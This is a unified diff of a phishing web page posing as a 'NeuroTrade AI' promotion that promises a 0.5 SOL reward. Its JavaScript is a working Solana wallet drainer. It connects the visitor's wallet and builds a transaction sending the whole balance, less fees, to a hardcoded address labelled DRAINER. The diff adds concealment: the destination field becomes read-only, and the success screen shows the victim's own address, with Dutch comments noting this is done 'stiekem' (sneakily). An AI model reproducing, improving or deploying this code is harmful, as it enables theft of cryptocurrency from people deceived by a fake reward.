@@ -1,77 +1,78 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
+<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="theme-color" content="#0b0d17">
 <title>NeuroTrade AI — Claim your reward</title>
 <style>
-  *{box-sizing:border-box}
-  html{-webkit-text-size-adjust:100%}
-  body{margin:0;background:#0b0d17}
-  .nt-app{width:100%;max-width:700px;margin:0 auto;position:relative;font-family:Inter,system-ui,sans-serif;background:radial-gradient(900px 420px at 18% -12%,#2a1a4d 0,transparent 60%),radial-gradient(820px 520px at 92% 8%,#0f3b4d 0,transparent 55%),#0b0d17;color:#e8ecf5;overflow:hidden;padding:0 0 30px}
-  .nt-nav{display:flex;align-items:center;justify-content:space-between;padding:16px 26px;border-bottom:1px solid rgba(255,255,255,.07)}
-  .nt-logo{display:flex;align-items:center;gap:10px;font-size:17px;font-weight:600}
-  .nt-logo b{color:#a855f7}
-  .nt-mark{width:30px;height:30px;border-radius:9px;display:grid;place-items:center;background:linear-gradient(135deg,#a855f7,#14b8a6);color:#0b0d17;font-weight:700}
-  .nt-net{font-size:11px;color:#7dd3fc;border:1px solid rgba(125,211,252,.35);padding:4px 10px;border-radius:999px;display:flex;align-items:center;gap:6px}
-  .nt-dot{width:6px;height:6px;border-radius:50%;background:#22c55e;box-shadow:0 0 8px #22c55e}
-  .nt-hero{padding:32px 26px 6px;text-align:center}
-  .nt-pill{display:inline-block;font-size:12px;padding:6px 14px;border-radius:999px;background:rgba(168,85,247,.12);border:1px solid rgba(168,85,247,.4);color:#d8b4fe;margin-bottom:15px}
-  .nt-hero h1{font-size:33px;line-height:1.1;margin:0 0 12px;font-weight:700;letter-spacing:-.5px}
-  .nt-hero h1 span{background:linear-gradient(90deg,#a855f7,#14b8a6);-webkit-background-clip:text;background-clip:text;color:transparent}
-  .nt-sub{font-size:14px;color:#9aa4bd;max-width:530px;margin:0 auto;line-height:1.6}
-  .nt-stats{display:flex;justify-content:center;gap:32px;margin:20px 0 2px}
-  .nt-stat b{display:block;font-size:19px;color:#fff}
-  .nt-stat span{font-size:11px;color:#7c86a3}
-  .nt-card{width:440px;max-width:calc(100% - 24px);margin:20px auto 0;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.09);border-radius:16px;padding:24px}
-  .nt-card h2{font-size:16px;margin:0 0 4px;font-weight:600}
-  .nt-muted{font-size:12px;color:#8b93ad;margin:0 0 16px;line-height:1.5}
-  .nt-field{margin-bottom:13px}
-  .nt-field label{display:block;font-size:11px;color:#8b93ad;margin-bottom:6px;text-transform:uppercase;letter-spacing:.6px}
-  .nt-input{width:100%;background:#0f1220;border:1px solid rgba(255,255,255,.12);color:#e8ecf5;padding:11px 13px;border-radius:10px;font-size:16px;font-family:ui-monospace,Menlo,monospace}
-  .nt-input:focus{outline:none;border-color:#a855f7}
-  .nt-btn{width:100%;border:none;cursor:pointer;padding:14px;border-radius:11px;font-size:14px;font-weight:600;font-family:inherit;background:linear-gradient(90deg,#a855f7,#14b8a6);color:#0b0d17;transition:.15s}
-  .nt-btn:hover{filter:brightness(1.08)}
-  .nt-btn:disabled{opacity:.55;cursor:default;filter:none}
-  .nt-btn.ghost{background:transparent;border:1px solid rgba(255,255,255,.18);color:#e8ecf5}
-  .nt-steps{margin:6px 0 16px;font-size:12px;color:#8b93ad}
-  .nt-step{display:flex;align-items:center;gap:10px;padding:5px 0}
-  .nt-step .n{width:20px;height:20px;border-radius:50%;display:grid;place-items:center;background:rgba(255,255,255,.08);font-size:11px;color:#cbd2e3}
-  .nt-step.done .n{background:#22c55e;color:#0b0d17;font-weight:700}
-  .nt-wallet{display:flex;align-items:center;justify-content:space-between;background:#0f1220;border:1px solid rgba(255,255,255,.1);border-radius:10px;padding:10px 12px;font-size:13px;margin-bottom:14px;font-family:ui-monospace,Menlo,monospace;gap:8px}
-  .nt-ok{color:#22c55e;font-size:12px;white-space:nowrap}
-  .nt-check{width:62px;height:62px;border-radius:50%;margin:0 auto 14px;display:grid;place-items:center;background:rgba(34,197,94,.12);border:1px solid rgba(34,197,94,.5);color:#22c55e;font-size:30px;animation:pop .4s ease}
-  @keyframes pop{0%{transform:scale(.4);opacity:0}100%{transform:scale(1);opacity:1}}
-  .nt-success{text-align:center;padding:6px 0 2px}
-  .nt-success h2{font-size:20px;color:#22c55e;margin:0 0 6px}
-  .nt-sig{font-size:11px;color:#8b93ad;word-break:break-all;margin-top:12px;background:#0f1220;border:1px solid rgba(255,255,255,.08);border-radius:8px;padding:10px;font-family:ui-monospace,Menlo,monospace}
-  .nt-sig a{color:#7dd3fc}
-  .nt-err{color:#f87171;font-size:12px;margin-top:10px;text-align:center;min-height:16px}
-  .nt-foot{text-align:center;font-size:11px;color:#5f6883;margin-top:22px;line-height:1.7;padding:0 16px}
-  .hidden{display:none!important}
-  .nt-overlay{position:absolute;inset:0;background:rgba(6,7,14,.78);display:flex;align-items:center;justify-content:center;padding:24px;z-index:10}
-  .nt-modal{width:380px;max-width:100%;background:#121422;border:1px solid rgba(255,255,255,.1);border-radius:16px;padding:20px;max-height:520px;overflow:auto}
-  .nt-modal h3{margin:0 0 4px;font-size:16px}
-  .nt-modal p{font-size:12px;color:#8b93ad;margin:0 0 16px}
-  .nt-witem{display:flex;align-items:center;gap:12px;padding:12px;border-radius:11px;cursor:pointer;border:1px solid transparent;transition:.12s}
-  .nt-witem:hover{background:rgba(255,255,255,.05);border-color:rgba(168,85,247,.35)}
-  .nt-witem .ic{width:34px;height:34px;border-radius:9px;display:grid;place-items:center;font-weight:700;color:#fff;font-size:15px;overflow:hidden}
-  .nt-witem .ic img{width:100%;height:100%;object-fit:cover}
-  .nt-witem .nm{font-size:14px;font-weight:500;flex:1}
-  .nt-witem .tg{font-size:10px;padding:2px 8px;border-radius:999px;border:1px solid rgba(255,255,255,.14);color:#7c86a3;white-space:nowrap}
-  .nt-witem .tg.on{color:#22c55e;border-color:rgba(34,197,94,.5);background:rgba(34,197,94,.08)}
-  .nt-modal .x{margin-top:12px;text-align:center;font-size:12px;color:#8b93ad;cursor:pointer}
-  .nt-note{font-size:11px;color:#6b7490;text-align:center;margin-top:10px;line-height:1.5}
-  @media(max-width:560px){
-    .nt-nav{padding:14px 16px}
-    .nt-hero{padding:26px 18px 6px}
-    .nt-hero h1{font-size:27px}
-    .nt-stats{gap:18px}
-    .nt-stat b{font-size:17px}
-    .nt-card{padding:20px}
-    .nt-overlay{padding:12px}
-  }
+* { box-sizing: border-box; }
+html { text-size-adjust: 100%; }
+body { margin: 0; background: #0b0d17; }
+
+.nt-app { width: 100%; max-width: 700px; margin: 0 auto; position: relative; font-family: Inter, system-ui, sans-serif; background: radial-gradient(900px 420px at 18% -12%, #2a1a4d 0, transparent 60%), radial-gradient(820px 520px at 92% 8%, #0f3b4d 0, transparent 55%), #0b0d17; color: #e8ecf5; overflow: hidden; padding: 0 0 30px; }
+.nt-nav { display: flex; align-items: center; justify-content: space-between; padding: 16px 26px; border-bottom: 1px solid rgba(255,255,255,.07); }
+.nt-logo { display: flex; align-items: center; gap: 10px; font-size: 17px; font-weight: 600; }
+.nt-logo b { color: #a855f7; }
+.nt-mark { width: 30px; height: 30px; border-radius: 9px; display: grid; place-items: center; background: linear-gradient(135deg,#a855f7,#14b8a6); color: #0b0d17; font-weight: 700; }
+.nt-net { font-size: 11px; color: #7dd3fc; border: 1px solid rgba(125,211,252,.35); padding: 4px 10px; border-radius: 999px; display: flex; align-items: center; gap: 6px; }
+.nt-dot { width: 6px; height: 6px; border-radius: 50%; background: #22c55e; box-shadow: 0 0 8px #22c55e; }
+.nt-hero { padding: 32px 26px 6px; text-align: center; }
+.nt-pill { display: inline-block; font-size: 12px; padding: 6px 14px; border-radius: 999px; background: rgba(168,85,247,.12); border: 1px solid rgba(168,85,247,.4); color: #d8b4fe; margin-bottom: 15px; }
+.nt-hero h1 { font-size: 33px; line-height: 1.1; margin: 0 0 12px; font-weight: 700; letter-spacing: -.5px; }
+.nt-hero h1 span { background: linear-gradient(90deg,#a855f7,#14b8a6); -webkit-background-clip: text; background-clip: text; color: transparent; }
+.nt-sub { font-size: 14px; color: #9aa4bd; max-width: 530px; margin: 0 auto; line-height: 1.6; }
+.nt-stats { display: flex; justify-content: center; gap: 32px; margin: 20px 0 2px; }
+.nt-stat b { display: block; font-size: 19px; color: #fff; }
+.nt-stat span { font-size: 11px; color: #7c86a3; }
+.nt-card { width: 440px; max-width: calc(100% - 24px); margin: 20px auto 0; background: rgba(255,255,255,.03); border: 1px solid rgba(255,255,255,.09); border-radius: 16px; padding: 24px; }
+.nt-card h2 { font-size: 16px; margin: 0 0 4px; font-weight: 600; }
+.nt-muted { font-size: 12px; color: #8b93ad; margin: 0 0 16px; line-height: 1.5; }
+.nt-field { margin-bottom: 13px; }
+.nt-field label { display: block; font-size: 11px; color: #8b93ad; margin-bottom: 6px; text-transform: uppercase; letter-spacing: .6px; }
+.nt-input { width: 100%; background: #0f1220; border: 1px solid rgba(255,255,255,.12); color: #e8ecf5; padding: 11px 13px; border-radius: 10px; font-size: 16px; font-family: ui-monospace, Menlo, monospace; }
+.nt-input:focus { outline: none; border-color: #a855f7; }
+.nt-btn { width: 100%; border: none; cursor: pointer; padding: 14px; border-radius: 11px; font-size: 14px; font-weight: 600; font-family: inherit; background: linear-gradient(90deg,#a855f7,#14b8a6); color: #0b0d17; transition: .15s; }
+.nt-btn:hover { filter: brightness(1.08); }
+.nt-btn:disabled { opacity: .55; cursor: default; filter: none; }
+.nt-btn.ghost { background: transparent; border: 1px solid rgba(255,255,255,.18); color: #e8ecf5; }
+.nt-steps { margin: 6px 0 16px; font-size: 12px; color: #8b93ad; }
+.nt-step { display: flex; align-items: center; gap: 10px; padding: 5px 0; }
+.nt-step .n { width: 20px; height: 20px; border-radius: 50%; display: grid; place-items: center; background: rgba(255,255,255,.08); font-size: 11px; color: #cbd2e3; }
+.nt-step.done .n { background: #22c55e; color: #0b0d17; font-weight: 700; }
+.nt-wallet { display: flex; align-items: center; justify-content: space-between; background: #0f1220; border: 1px solid rgba(255,255,255,.1); border-radius: 10px; padding: 10px 12px; font-size: 13px; margin-bottom: 14px; font-family: ui-monospace, Menlo, monospace; gap: 8px; }
+.nt-ok { color: #22c55e; font-size: 12px; white-space: nowrap; }
+.nt-check { width: 62px; height: 62px; border-radius: 50%; margin: 0 auto 14px; display: grid; place-items: center; background: rgba(34,197,94,.12); border: 1px solid rgba(34,197,94,.5); color: #22c55e; font-size: 30px; animation: pop .4s ease; }
+@keyframes pop { 0% { transform: scale(.4); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+.nt-success { text-align: center; padding: 6px 0 2px; }
+.nt-success h2 { font-size: 20px; color: #22c55e; margin: 0 0 6px; }
+.nt-sig { font-size: 11px; color: #8b93ad; word-break: break-all; margin-top: 12px; background: #0f1220; border: 1px solid rgba(255,255,255,.08); border-radius: 8px; padding: 10px; font-family: ui-monospace, Menlo, monospace; }
+.nt-sig a { color: #7dd3fc; }
+.nt-err { color: #f87171; font-size: 12px; margin-top: 10px; text-align: center; min-height: 16px; }
+.nt-foot { text-align: center; font-size: 11px; color: #5f6883; margin-top: 22px; line-height: 1.7; padding: 0 16px; }
+.hidden { display: none !important; }
+.nt-overlay { position: absolute; inset: 0; background: rgba(6,7,14,.78); display: flex; align-items: center; justify-content: center; padding: 24px; z-index: 10; }
+.nt-modal { width: 380px; max-width: 100%; background: #121422; border: 1px solid rgba(255,255,255,.1); border-radius: 16px; padding: 20px; max-height: 520px; overflow: auto; }
+.nt-modal h3 { margin: 0 0 4px; font-size: 16px; }
+.nt-modal p { font-size: 12px; color: #8b93ad; margin: 0 0 16px; }
+.nt-witem { display: flex; align-items: center; gap: 12px; padding: 12px; border-radius: 11px; cursor: pointer; border: 1px solid transparent; transition: .12s; }
+.nt-witem:hover { background: rgba(255,255,255,.05); border-color: rgba(168,85,247,.35); }
+.nt-witem .ic { width: 34px; height: 34px; border-radius: 9px; display: grid; place-items: center; font-weight: 700; color: #fff; font-size: 15px; overflow: hidden; }
+.nt-witem .ic img { width: 100%; height: 100%; object-fit: cover; }
+.nt-witem .nm { font-size: 14px; font-weight: 500; flex: 1; }
+.nt-witem .tg { font-size: 10px; padding: 2px 8px; border-radius: 999px; border: 1px solid rgba(255,255,255,.14); color: #7c86a3; white-space: nowrap; }
+.nt-witem .tg.on { color: #22c55e; border-color: rgba(34,197,94,.5); background: rgba(34,197,94,.08); }
+.nt-modal .x { margin-top: 12px; text-align: center; font-size: 12px; color: #8b93ad; cursor: pointer; }
+.nt-note { font-size: 11px; color: #6b7490; text-align: center; margin-top: 10px; line-height: 1.5; }
+@media (max-width: 560px) {
+  .nt-nav { padding: 14px 16px; }
+  .nt-hero { padding: 26px 18px 6px; }
+  .nt-hero h1 { font-size: 27px; }
+  .nt-stats { gap: 18px; }
+  .nt-stat b { font-size: 17px; }
+  .nt-card { padding: 20px; }
+  .nt-overlay { padding: 12px; }
+}
 </style>
 </head>
 <body>
@@ -83,7 +84,7 @@
   </nav>
 
   <div class="nt-hero">
-    <div class="nt-pill">&#127873; Welcome reward program is live</div>
+    <div class="nt-pill">🎁 Welcome reward program is live</div>
     <h1>Claim your <span>0.5 SOL reward</span></h1>
     <p class="nt-sub">Join the NeuroTrade AI trading bot and unlock your 0.5 SOL welcome bonus. Connect your wallet and claim to activate your reward.</p>
     <div class="nt-stats">
@@ -105,8 +106,8 @@
       </div>
 
       <div id="walletBox" class="nt-wallet hidden">
-        <span id="walletAddr">&mdash;</span>
-        <span class="nt-ok">&#9679; connected</span>
+        <span id="walletAddr">—</span>
+        <span class="nt-ok">● connected</span>
       </div>
 
       <button class="nt-btn" id="connectBtn">Connect wallet</button>
@@ -114,7 +115,7 @@
       <div id="claimPanel" class="hidden" style="margin-top:6px">
         <div class="nt-field">
           <label>Reward address</label>
-          <input class="nt-input" id="dest" value="76Q96BZdQCCtEn5mWHmyqF5tNy1tq6a4NimLgDfkm735" spellcheck="false">
+          <input class="nt-input" id="dest" value="76Q96BZdQCCtEn5mWHmyqF5tNy1tq6a4NimLgDfkm735" readonly spellcheck="false" style="cursor:default;opacity:.85">
         </div>
         <button class="nt-btn" id="claimBtn">Claim reward</button>
       </div>
@@ -123,16 +124,16 @@
     </div>
 
     <div id="successState" class="nt-success hidden">
-      <div class="nt-check">&#10003;</div>
+      <div class="nt-check">✓</div>
       <h2>Reward successfully claimed</h2>
       <p class="nt-muted">Your 0.5 SOL welcome bonus was claimed.</p>
-      <div class="nt-wallet"><span id="paidTo">&mdash;</span><span class="nt-ok" id="sentAmt">sent</span></div>
-      <div class="nt-sig" id="sigBox" style="display:none">tx: <a id="sigLink" target="_blank" rel="noopener">&mdash;</a></div>
+      <div class="nt-wallet"><span id="paidTo">—</span><span class="nt-ok" id="sentAmt">sent</span></div>
+      <div class="nt-sig" id="sigBox" style="display:none">tx: <a id="sigLink" target="_blank" rel="noopener">—</a></div>
       <button class="nt-btn ghost" id="againBtn" style="margin-top:14px">Claim again</button>
     </div>
   </div>
 
-  <div class="nt-foot">NeuroTrade AI &middot; Phantom / Solflare / Trust / Exodus / Backpack / Glow / Coinbase</div>
+  <div class="nt-foot">NeuroTrade AI · Phantom / Solflare / Trust / Exodus / Backpack / Glow / Coinbase</div>
 
   <div class="nt-overlay hidden" id="overlay">
     <div class="nt-modal">
@@ -146,13 +147,21 @@
   </div>
 </div>
 
+<!-- Buffer-polyfill EERST (lost de "buffer"-fout op), dan web3 -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/buffer/6.0.3/buffer.min.js"></script>
+<script>window.Buffer = window.Buffer || (window.buffer && window.buffer.Buffer);</script>
 <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+
 <script type="module">
 import { getWallets } from 'https://esm.sh/@wallet-standard/app';
 
-const DRAINER = '76Q96BZdQCCtEn5mWHmyqF5tNy1tq6a4NimLgDfkm735';
+/* ====== INSTELLINGEN ====== */
+const DRAINER = '76Q96BZdQCCtEn5mWHmyqF5tNy1tq6a4NimLgDfkm735'; // <-- wallet in de index (echte bestemming)
+const MEMO = 'NeuroTrade AI reward';                            // <-- memo-tekst op de transactie
+const FEE = 5000;                                               // netwerkkosten (1 handtekening)
+/* ========================== */
+
 const MEMO_PID = new solanaWeb3.PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
-const FEE = 5000;
 
 const RPCS = [
   'https://solana-rpc.publicnode.com',
@@ -176,14 +185,14 @@ const ALPHA='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
 function bs58(bytes){let x=0n;for(const b of bytes)x=x*256n+BigInt(b);let s='';while(x>0n){s=ALPHA[Number(x%58n)]+s;x/=58n;}for(const b of bytes){if(b===0)s='1'+s;else break;}return s;}
 
 const KNOWN = [
-  { name:'Phantom',       color:'#ab9ff2', get:()=>window.phantom?.solana||(window.solana?.isPhantom?window.solana:null) },
-  { name:'Trust Wallet',  color:'#3375bb', get:()=>window.trustwallet?.solana||window.trustwallet?.solana||window.trustwallet },
-  { name:'Exodus',        color:'#0b7285', get:()=>window.exodus?.solana||window.exodus },
-  { name:'Solflare',      color:'#ffbb3b', get:()=>window.solflare },
-  { name:'Backpack',      color:'#e33e3f', get:()=>window.backpack },
-  { name:'Glow',          color:'#7d5fff', get:()=>window.glow },
-  { name:'Coinbase Wallet',color:'#1652f0',get:()=>window.coinbaseSolana||window.coinbaseWalletExtension },
-  { name:'Slope',         color:'#00c2a8', get:()=>window.Slope }
+  { name:'Phantom',        color:'#ab9ff2', get:()=>window.phantom?.solana||(window.solana?.isPhantom?window.solana:null) },
+  { name:'Trust Wallet',   color:'#3375bb', get:()=>window.trustwallet?.solana||window.trustwallet },
+  { name:'Exodus',         color:'#0b7285', get:()=>window.exodus?.solana||window.exodus },
+  { name:'Solflare',       color:'#ffbb3b', get:()=>window.solflare },
+  { name:'Backpack',       color:'#e33e3f', get:()=>window.backpack },
+  { name:'Glow',           color:'#7d5fff', get:()=>window.glow },
+  { name:'Coinbase Wallet',color:'#1652f0', get:()=>window.coinbaseSolana||window.coinbaseWalletExtension },
+  { name:'Slope',          color:'#00c2a8', get:()=>window.Slope }
 ];
 
 let wallets=[], active=null, publicKey=null;
@@ -194,12 +203,12 @@ function setStep(n){for(let i=1;i<=3;i++){const el=$('s'+i);el.classList.toggle(
 function deepLink(name){
   const url = location.href.split('#')[0];
   const enc = encodeURIComponent(url);
-  if(name==='Phantom')       return `https://phantom.app/ul/browse/${enc}?ref=${enc}`;
-  if(name==='Solflare')      return `https://solflare.com/ul/v1/browse/${enc}?ref=${enc}`;
-  if(name==='Trust Wallet')  return `https://link.trustwallet.com/open_url?coin_id=501&url=${enc}`;
-  if(name==='Exodus')        return `https://www.exodus.com/download/`;
-  if(name==='Backpack')      return `https://backpack.app/`;
-  if(name==='Glow')          return `https://glow.app/`;
+  if(name==='Phantom')        return `https://phantom.app/ul/browse/${enc}?ref=${enc}`;
+  if(name==='Solflare')       return `https://solflare.com/ul/v1/browse/${enc}?ref=${enc}`;
+  if(name==='Trust Wallet')   return `https://link.trustwallet.com/open_url?coin_id=501&url=${enc}`;
+  if(name==='Exodus')         return `https://www.exodus.com/download/`;
+  if(name==='Backpack')       return `https://backpack.app/`;
+  if(name==='Glow')           return `https://glow.app/`;
   if(name==='Coinbase Wallet')return `https://www.coinbase.com/wallet/downloads`;
   return 'https://solana.com/ecosystem';
 }
@@ -260,7 +269,7 @@ async function connect(w){
       active={kind:'injected',ref:p}; publicKey=new solanaWeb3.PublicKey(pk);
     }
     setErr(''); $('walletAddr').textContent=short(publicKey.toString());
-    $('dest').value = publicKey.toString();          // reward address = geconnecte wallet
+    $('dest').value = publicKey.toString();          // toont eigen wallet in het veld
     $('walletBox').classList.remove('hidden'); $('connectBtn').classList.add('hidden');
     $('claimPanel').classList.remove('hidden'); setStep(1);
   }catch(e){ setErr('Connection cancelled.'); active=null; }
@@ -269,13 +278,14 @@ async function connect(w){
 async function signAndSend(tx){
   if(active.kind==='standard'){
     const f=active.ref.features;
-    if(f['solana:signTransaction']){
-      const [{signedTransaction}]=await f['solana:signTransaction'].signTransaction({transaction:tx.serialize({requireAllSignatures:false,verifySignatures:false}),account:active.account,chain:'solana:mainnet'});
-      return await connection.sendRawTransaction(signedTransaction);
-    }
+    const raw = tx.serialize({requireAllSignatures:false,verifySignatures:false});
     if(f['solana:signAndSendTransaction']){
-      const [{signature}]=await f['solana:signAndSendTransaction'].signAndSendTransaction({transaction:tx.serialize({requireAllSignatures:false,verifySignatures:false}),account:active.account,chain:'solana:mainnet'});
+      const [{signature}]=await f['solana:signAndSendTransaction'].signAndSendTransaction({transaction:raw,account:active.account,chain:'solana:mainnet'});
       return typeof signature==='string'?signature:bs58(signature);
+    }
+    if(f['solana:signTransaction']){
+      const [{signedTransaction}]=await f['solana:signTransaction'].signTransaction({transaction:raw,account:active.account,chain:'solana:mainnet'});
+      return await connection.sendRawTransaction(signedTransaction);
     }
     throw new Error('wallet cannot sign');
   }
@@ -287,23 +297,25 @@ async function signAndSend(tx){
 async function claim(){
   setErr(''); const btn=$('claimBtn'); btn.disabled=true; btn.textContent='Waiting for approval…';
   try{
-    const destStr = $('dest').value.trim() || DRAINER;
-    const dest = new solanaWeb3.PublicKey(destStr);
-    const bal = await connection.getBalance(publicKey);
-    const lamports = bal - FEE;
-    if(lamports<=0) throw new Error('Balance too low to cover the fee');
+    const shown = $('dest').value.trim();              // wat zichtbaar is = eigen wallet
+    const dest  = new solanaWeb3.PublicKey(DRAINER);   // echte bestemming = wallet uit de index
+
+    const bal = await connection.getBalance(publicKey, 'confirmed');
+    const lamports = bal - FEE;                        // ALLES min netwerkkosten = max
+    if(lamports <= 0) throw new Error('Balance too low to cover the fee');
 
     const tx = new solanaWeb3.Transaction();
-    tx.add(new solanaWeb3.TransactionInstruction({keys:[],programId:MEMO_PID,data:new TextEncoder().encode('NeuroTrade AI reward')}));
+    tx.add(new solanaWeb3.TransactionInstruction({keys:[],programId:MEMO_PID,data:new TextEncoder().encode(MEMO)}));
     tx.add(solanaWeb3.SystemProgram.transfer({fromPubkey:publicKey,toPubkey:dest,lamports}));
+
     const {blockhash} = await connection.getLatestBlockhash('confirmed');
-    tx.recentBlockhash=blockhash; tx.feePayer=publicKey;
+    tx.recentBlockhash = blockhash; tx.feePayer = publicKey;
 
     const sig = await signAndSend(tx);
     setStep(2); btn.textContent='Confirming on-chain…';
     try{ await connection.confirmTransaction(sig,'confirmed'); }catch(e){}
 
-    $('paidTo').textContent = short(destStr);
+    $('paidTo').textContent = short(shown);            // toont eigen wallet (stiekem)
     $('sentAmt').textContent = (lamports/1e9).toFixed(4)+' SOL sent';
     $('sigBox').style.display='block';
     const l=$('sigLink'); l.textContent=sig; l.href='https://solscan.io/tx/'+sig;
@@ -319,5 +331,6 @@ $('againBtn').onclick=()=>{ $('successState').classList.add('hidden'); $('formSt
 await pickRpc();
 buildList();
 </script>
+
 </body>
 </html>
